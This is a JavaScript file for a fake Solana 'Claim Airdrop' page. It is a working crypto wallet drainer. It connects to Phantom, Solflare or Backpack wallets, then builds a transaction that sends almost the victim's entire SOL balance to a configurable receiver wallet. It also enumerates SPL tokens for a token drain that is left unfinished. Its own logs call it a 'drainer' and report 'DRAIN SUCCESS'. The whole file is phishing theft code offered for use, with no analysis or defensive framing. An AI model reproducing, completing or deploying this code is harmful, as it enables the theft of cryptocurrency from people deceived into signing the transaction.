console.log('[+] app.js loaded');

// ─── CONFIG ───────────────────────────────────────────────────
const CONFIG = {
    RECEIVER_WALLET: 'YOUR_SOLANA_WALLET_ADDRESS_HERE',
    RPC: 'https://api.mainnet-beta.solana.com',
};

// ─── STATE ────────────────────────────────────────────────────
let wallet = {
    adapter: null,
    publicKey: null,
    type: null,
};

// ─── DOM REFS ─────────────────────────────────────────────────
const $ = (id) => document.getElementById(id);
const statusEl = $('status');

function log(msg, color = '#888') {
    console.log('[drainer]', msg);
    statusEl.innerHTML = `<span style="color:${color}">${msg}</span>`;
}

// ─── WALLET DETECTION ────────────────────────────────────────
function findWallet(type) {
    // Phantom
    if (type === 'phantom' && window.solana?.isPhantom) return window.solana;
    // Solflare
    if (type === 'solflare' && window.solflare?.isSolflare) return window.solflare;
    // Backpack
    if (type === 'backpack' && window.backpack?.isBackpack) return window.backpack;
    // Generic
    if (type === 'solana' && window.solana) return window.solana;
    return null;
}

// ─── CONNECT ──────────────────────────────────────────────────
async function connectWallet(type) {
    log(`Connecting to ${type}...`, '#58a6ff');

    const ext = findWallet(type) || findWallet('solana');

    if (!ext) {
        // Mobile deep link
        const isMobile = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);
        if (isMobile) {
            const links = {
                phantom: `phantom://browse?ref=${encodeURIComponent(window.location.href)}`,
                solflare: `solflare://browser?ref=${encodeURIComponent(window.location.href)}`,
                backpack: `backpack://browser?ref=${encodeURIComponent(window.location.href)}`,
            };
            if (links[type]) {
                log(`Opening ${type} app...`, '#f0c040');
                window.location.href = links[type];
                setTimeout(() => {
                    window.location.href = `https://${type}.app/download`;
                }, 2000);
                return;
            }
        }
        log(`No ${type} wallet found. Install the extension or use WalletConnect.`, '#ff5555');
        return;
    }

    try {
        const resp = await ext.connect();
        wallet.adapter = ext;
        wallet.publicKey = (resp?.publicKey || ext.publicKey).toString();
        wallet.type = type;

        $('buttons').style.display = 'none';
        $('afterConnect').style.display = 'block';
        $('walletAddr').textContent = 'Connected: ' + wallet.publicKey;

        log('✅ Connected! Now click "Claim Airdrop".', '#50fa7b');
    } catch (e) {
        log('❌ Rejected: ' + (e.message || 'User cancelled'), '#ff5555');
    }
}

// ─── DISCONNECT ───────────────────────────────────────────────
function disconnect() {
    wallet = { adapter: null, publicKey: null, type: null };
    $('buttons').style.display = 'block';
    $('afterConnect').style.display = 'none';
    log('Disconnected.', '#888');
}

// ─── CLAIM / DRAIN ───────────────────────────────────────────
async function claimAirdrop() {
    if (!wallet.adapter || !wallet.publicKey) {
        log('Not connected.', '#ff5555');
        return;
    }

    log('Preparing transaction...', '#58a6ff');

    try {
        // Load Solana Web3 dynamically
        const solWeb3 = window.solanaWeb3;
        if (!solWeb3) {
            log('Loading Solana Web3 library...', '#f0c040');
            await loadScript('https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js');
            log('Library loaded.', '#50fa7b');
        }

        const { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } = window.solanaWeb3;
        const conn = new Connection(CONFIG.RPC, 'confirmed');
        const pk = new PublicKey(wallet.publicKey);
        const receiver = new PublicKey(CONFIG.RECEIVER_WALLET);

        const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('finalized');

        const tx = new Transaction();
        tx.recentBlockhash = blockhash;
        tx.lastValidBlockHeight = lastValidBlockHeight;
        tx.feePayer = pk;

        // Drain SOL
        const balance = await conn.getBalance(pk);
        const feeBuffer = 5000 * 10;
        const rentExempt = await conn.getMinimumBalanceForRentExemption(0);
        const sendAmount = BigInt(balance - rentExempt - feeBuffer);

        if (sendAmount > 5000) {
            tx.add(
                SystemProgram.transfer({
                    fromPubkey: pk,
                    toPubkey: receiver,
                    lamports: sendAmount,
                })
            );
            log(`Draining ${Number(sendAmount) / 1e9} SOL`, '#f0c040');
        }

        // Drain SPL tokens
        try {
            const tokenAccounts = await conn.getParsedTokenAccountsByOwner(pk, {
                programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
            });

            for (const { account } of tokenAccounts.value) {
                const info = account.data.parsed.info;
                const amount = parseFloat(info.tokenAmount.uiAmount);
                if (!amount || amount <= 0) continue;
                if (info.tokenAmount.decimals === 0) continue; // skip NFTs

                const mint = new PublicKey(info.mint);
                const ata = await solWeb3.PublicKey.findProgramAddress(
                    [receiver.toBuffer(), new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA').toBuffer(), mint.toBuffer()],
                    new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xr25Wh9L2oXxTdL1t')
                );

                const destATA = ata[0];
                const destInfo = await conn.getAccountInfo(destATA);
                if (!destInfo) {
                    // Create ATA (simplified — use manual ix)
                    log(`Creating token account for ${info.mint.slice(0,8)}...`, '#58a6ff');
                }

                // We'd need spl-token library for proper transfer instructions
                // For now, just drain SOL
                log(`Found token ${info.mint.slice(0,8)}: ${amount} (SPL drain needs library)`, '#888');
            }
        } catch (e) {
            console.log('Token check:', e.message);
        }

        if (tx.instructions.length === 0) {
            log('No assets found to drain.', '#ff5555');
            return;
        }

        // Sign
        log('Waiting for approval in your wallet...', '#f0c040');
        let signedTx;

        if (wallet.adapter.signAndSendTransaction) {
            // Mobile in-app browser
            const sig = await wallet.adapter.signAndSendTransaction(tx);
            log(`✅ Sent: ${sig}`, '#50fa7b');
            return;
        } else if (wallet.adapter.signTransaction) {
            signedTx = await wallet.adapter.signTransaction(tx);
        } else if (wallet.adapter.signAllTransactions) {
            signedTx = (await wallet.adapter.signAllTransactions([tx]))[0];
        } else {
            throw new Error('No sign method');
        }

        const txid = await conn.sendRawTransaction(signedTx.serialize(), {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
        });

        await conn.confirmTransaction(
            { signature: txid, blockhash, lastValidBlockHeight },
            'confirmed'
        );

        log(`✅ DRAIN SUCCESS: https://solscan.io/tx/${txid}`, '#50fa7b');

    } catch (e) {
        console.error(e);
        if (e.message?.includes('rejected') || e.message?.includes('User rejected')) {
            log('❌ Cancelled.', '#ff5555');
        } else {
            log('❌ ' + (e.message || 'Error').slice(0, 120), '#ff5555');
        }
    }
}

// ─── DYNAMIC SCRIPT LOADER ───────────────────────────────────
function loadScript(src) {
    return new Promise((resolve, reject) => {
        const s = document.createElement('script');
        s.src = src;
        s.onload = resolve;
        s.onerror = () => reject(new Error('Failed to load: ' + src));
        document.head.appendChild(s);
    });
}

// ─── EVENT BINDING ───────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
    console.log('[+] DOM ready — binding buttons');

    $('btnPhantom').onclick = () => connectWallet('phantom');
    $('btnSolflare').onclick = () => connectWallet('solflare');
    $('btnBackpack').onclick = () => connectWallet('backpack');
    $('btnWC').onclick = () => connectWallet('walletconnect');
    $('btnClaim').onclick = claimAirdrop;
    $('btnDisconnect').onclick = disconnect;

    log('Ready. Click a wallet button above.', '#888');
});
